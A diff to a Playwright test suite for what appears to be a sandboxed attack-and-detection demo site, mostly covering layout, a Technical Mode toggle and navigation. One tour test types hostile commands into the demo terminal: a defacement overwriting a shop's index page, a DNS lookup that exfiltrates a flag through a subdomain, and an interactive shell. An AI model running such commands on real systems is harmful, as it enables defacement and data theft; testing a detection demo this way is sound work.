@@ -49,6 +49,23 @@ async function hasNoProvenance(page: Page) {
 }
 
 /**
+ * The default view (ADR 0035, amendment 2026-10-13 b) is short: the palette, "This run", the
+ * one-click cards, the console, the run history and the evidence sections are in Technical Mode. Most
+ * tests read those panels, so they run as a visitor who switched Technical Mode on (stored, as
+ * theme.ts reads it before first paint); a test of the default view itself carries the @default tag.
+ */
+test.beforeEach(async ({ page }, info) => {
+  if (info.tags.includes("@default")) return;
+  await page.addInitScript(() => {
+    try {
+      if (localStorage.getItem("tech") === null) localStorage.setItem("tech", "on");
+    } catch {
+      /* storage blocked */
+    }
+  });
+});
+
+/**
  * The page's sections in order (ADR 0035, amended 2026-10-05), as every build ships them: the console
  * is inside #attack.
  */
@@ -175,7 +192,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(await page.evaluate(() => document.querySelector("#attack #console") !== null)).toBe(true);
     // The navigation follows the page; the one link to #verify is the footer's.
     // The SIEM's section is linked while it is shown (UX stage 1).
-    expect(await page.locator(".site-nav a").evaluateAll((as) => as.map((a) => a.getAttribute("href")))).toEqual(["#attack", "#correlation", "#how", "#posture", "#about"]);
+    expect(await page.locator(".site-nav a").evaluateAll((as) => as.map((a) => a.getAttribute("href")))).toEqual(["#attack", "#correlation", "#how", "#evidence", "#about"]);
     await expect(page.locator('.site-nav a[href="#correlation"]')).toBeVisible();
     await expect(page.locator('a[href="#verify"]')).toHaveCount(1);
     await expect(page.locator('footer.site-footer a[href="#verify"]')).toHaveCount(1);
@@ -213,17 +230,17 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await noHorizontalScroll(page);
   });
 
-  test("page-height budgets on a first visit (mock build): desktop 1440 at most 5500 px, phone 390 at most 9000 px", async ({ page }) => {
+  test("page-height budgets on a first visit (mock build, the default view): desktop 1440 at most 3200 px, phone 390 at most 5200 px", { tag: "@default" }, async ({ page }) => {
     // ADR 0035 amendment 2026-10-12. Measured with the mock banner in place (the live page has none).
     await page.setViewportSize({ width: 1440, height: 900 });
     await page.goto("/?mock=1");
     await expect(page.locator("#hero-stats .herostats__num")).toHaveCount(3);
     await expect(page.locator("#terminal .term-start__btn")).toBeVisible();
-    expect(await page.evaluate(() => document.documentElement.scrollHeight), "desktop").toBeLessThanOrEqual(5500);
+    expect(await page.evaluate(() => document.documentElement.scrollHeight), "desktop").toBeLessThanOrEqual(3200);
     await page.setViewportSize({ width: 390, height: 844 });
     await page.goto("/?mock=1");
     await expect(page.locator("#terminal .term-start__btn")).toBeVisible();
-    expect(await page.evaluate(() => document.documentElement.scrollHeight), "phone").toBeLessThanOrEqual(9000);
+    expect(await page.evaluate(() => document.documentElement.scrollHeight), "phone").toBeLessThanOrEqual(5200);
   });
 
   test("the diagram's nodes are reached by keyboard: Tab to one, Enter or Space opens its caption, Escape closes; aria-expanded follows", async ({ page, isMobile }) => {
@@ -426,22 +443,22 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     };
     // 1: the button opens the terminal with the command picked and the terminal in view.
     await page.evaluate(() => scrollTo(0, 0));
-    await current("look").getByRole("button", { name: "Do this step" }).click();
+    await current("look").locator(".tour__btn").click();
     await expect(term.locator(".term__grid")).toBeInViewport();
     await run("id");
     await expect(steps.locator('.tour__step[data-id="look"]')).toHaveAttribute("data-done", "true");
     // 2: the deface, then the flag.
-    await current("tamper").getByRole("button", { name: "Do this step" }).click();
+    await current("tamper").locator(".tour__btn").click();
     await run("echo pwned>/srv/shop/index.html;echo '{\"status\":\"defaced\"}'>/srv/shop/state.json");
     await expect(input).toBeEnabled({ timeout: 10_000 });
     await term.getByRole("button", { name: "cat /srv/shop/.flag" }).click();
     await expect(steps.locator('.tour__step[data-id="tamper"]')).toHaveAttribute("data-done", "true");
     // 3: the DNS trick.
-    await current("hide").getByRole("button", { name: "Do this step" }).click();
+    await current("hide").locator(".tour__btn").click();
     await run("nslookup sdp-<flag>.x.exfil.sdp.test.");
     await expect(steps.locator('.tour__step[data-id="hide"]')).toHaveAttribute("data-done", "true");
     // 4: the shell; caught; its done button shows this session's kill timeline.
-    await current("caught").getByRole("button", { name: "Do this step" }).click();
+    await current("caught").locator(".tour__btn").click();
     await run("sh -i");
     await expect(term.locator(".term__summary")).toBeVisible({ timeout: 15_000 });
     const watch = steps.locator('.tour__step[data-id="caught"]').getByRole("button", { name: "Watch the kill timeline" });
@@ -507,7 +524,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
   test("'Do this step' marks what it picked - the input it filled and the command's chip - with a ring and a 'Step n' tag that stays until the step is done", async ({ page }) => {
     await page.goto("/?mock=1&mock-speed=0.3");
     const tour = page.locator("#tour-steps");
-    if (!(await tour.isVisible())) await page.locator("#tour .tour").getByRole("button", { name: "Do this step" }).click();
+    if (!(await tour.isVisible())) await page.locator("#tour .tour").locator(".tour__btn").click();
     else await tour.locator('.tour__step[data-current="true"] .tour__btn').click();
     const form = page.locator("#terminal .term__form");
     await expect(page.locator("#term-input")).toHaveValue("id", { timeout: 10_000 });
@@ -572,7 +589,7 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     expect(m.sh).toBeLessThanOrEqual(m.ch);
     // No chip, no fade: nothing about an inner scroll is left.
     await expect(panel.locator(".tour__newchip")).toHaveCount(0);
-    expect(await panel.evaluate((el) => [getComputedStyle(el).overflowY, getComputedStyle(el).maskImage])).toEqual(["visible", "none"]);
+    await expect.poll(() => panel.evaluate((el) => [getComputedStyle(el).overflowY, getComputedStyle(el).maskImage])).toEqual(["visible", "none"]);
   });
 
   test("the About bar: the first About sentence verbatim, then the automation line on its own line", async ({ page }) => {
@@ -1344,7 +1361,7 @@ test.describe("unguarded twin (mock, ADR 0033)", () => {
 });
 
 test.describe("narrow screens", () => {
-  test("no horizontal scroll at 360 px with a finished run, Technical Mode and every panel open", async ({ page }) => {
+  test("no horizontal scroll at 360 px with a finished run, Technical Mode and every panel open", { tag: "@default" }, async ({ page }) => {
     await page.setViewportSize({ width: 360, height: 780 });
     await page.goto("/?mock=1&mock-speed=0.2");
     await page.locator("#tech-toggle").click();
@@ -1357,7 +1374,7 @@ test.describe("narrow screens", () => {
 });
 
 test.describe("technical mode", () => {
-  test("toggles raw detail, is announced as a pressed button and persists", async ({ page }) => {
+  test("toggles raw detail, is announced as a pressed button and persists", { tag: "@default" }, async ({ page }) => {
     await allActivity(page);
     const problems = guardConsole(page);
     await page.goto("/?mock=1");
@@ -1380,6 +1397,55 @@ test.describe("technical mode", () => {
     await expect(page.locator("#console .console__raw")).toBeHidden();
     await noHorizontalScroll(page);
     expect(problems).toEqual([]);
+  });
+
+  test("the default view is short: the hero, the terminal with the tour, the SIEM, How it works and About; Technical Mode shows the rest", { tag: "@default" }, async ({ page, isMobile }) => {
+    const problems = guardConsole(page);
+    await page.goto("/?mock=1");
+    const hidden = ["#console", "#timeline", ".launcher", "#objectives-fold", "#evidence", "#posture", "#verify", ".hero__secondary", '.site-nav a[href="#evidence"]'];
+    for (const sel of hidden) await expect(page.locator(sel).first(), sel).toBeHidden();
+    await expect(page.locator(".site-nav a:visible")).toHaveText(["Attack it", "SIEM", /^How( it works)?$/, "About"], { useInnerText: true });
+    await expect(page.locator("#tech-toggle")).toHaveAttribute("title", "Show the raw run data, the command palette, posture and verification");
+    // The terminal alone, the tour's step offering its one command as a chip; no palette, no "This run".
+    const term = page.locator("#terminal");
+    await term.getByRole("button", { name: /Open the terminal/ }).click();
+    await expect(page.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
+    await expect(term.locator(".term__palette")).toBeHidden();
+    await expect(term.locator(".term__side")).toBeHidden();
+    if (!isMobile) {
+      const chip = page.locator('#tour-steps .tour__step[data-current="true"] .tour__cmd');
+      await expect(chip).toHaveText(/id$/);
+      await chip.click();
+      await expect(page.locator("#term-input")).toHaveValue("id");
+    }
+    // One card holds the evidence; it opens in place, its three sections inside.
+    const card = page.getByRole("button", { name: /Evidence for the curious/ });
+    await expect(card).toHaveAttribute("aria-expanded", "false");
+    await card.click();
+    await expect(card).toHaveAttribute("aria-expanded", "true");
+    for (const id of ["#evidence", "#posture", "#verify"]) await expect(page.locator(id)).toBeVisible();
+    // Technical Mode: everything as before, the card gone.
+    await page.locator("#tech-toggle").click();
+    for (const sel of ["#console", "#timeline", ".launcher", "#evidence", "#posture", "#verify", ".hero__secondary"]) await expect(page.locator(sel).first(), sel).toBeVisible();
+    await expect(term.locator(".term__palette")).toBeVisible();
+    await expect(term.locator(".term__side")).toBeVisible();
+    await expect(page.locator("#curious")).toBeHidden();
+    expect(problems).toEqual([]);
+  });
+
+  test("a link to #posture in the default view opens the evidence card and the section", { tag: "@default" }, async ({ page }) => {
+    await page.goto("/?mock=1#posture");
+    await expect(page.locator(".curious__toggle")).toHaveAttribute("aria-expanded", "true");
+    await expect(page.locator("#posture")).toBeVisible();
+    await expect(page.locator("#posture .section__toggle")).toHaveAttribute("aria-expanded", "true");
+    await expect(page.locator("#posture-title")).toBeInViewport();
+    // The footer's link to #verify does the same from a fresh page (once the SIEM's section, which
+    // shows when the SIEM answers, has stopped moving what is below it).
+    await page.goto("/?mock=1");
+    await expect(page.locator("#correlation")).toBeVisible();
+    await page.locator('footer a[href="#verify"]').click();
+    await expect(page.locator("#verify")).toBeVisible();
+    await expect(page.locator("#verify-title")).toBeInViewport();
   });
 });
 
@@ -2137,7 +2203,7 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
       await page.goto("/?mock=1&mock-speed=0.2");
       const nav = page.locator(".site-nav");
       await expect(nav).toBeVisible();
-      await expect(nav.locator("a:visible")).toHaveText(["Attack it", "SIEM", "How", "Posture", "About"], { useInnerText: true });
+      await expect(nav.locator("a:visible")).toHaveText(["Attack it", "SIEM", "How", "Evidence", "About"], { useInnerText: true });
       await page.locator("#terminal").getByRole("button", { name: /Open the terminal/ }).click();
       await expect(page.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
       for (const d of await page.locator("#console details.verify").all()) await d.evaluate((e) => ((e as HTMLDetailsElement).open = true));
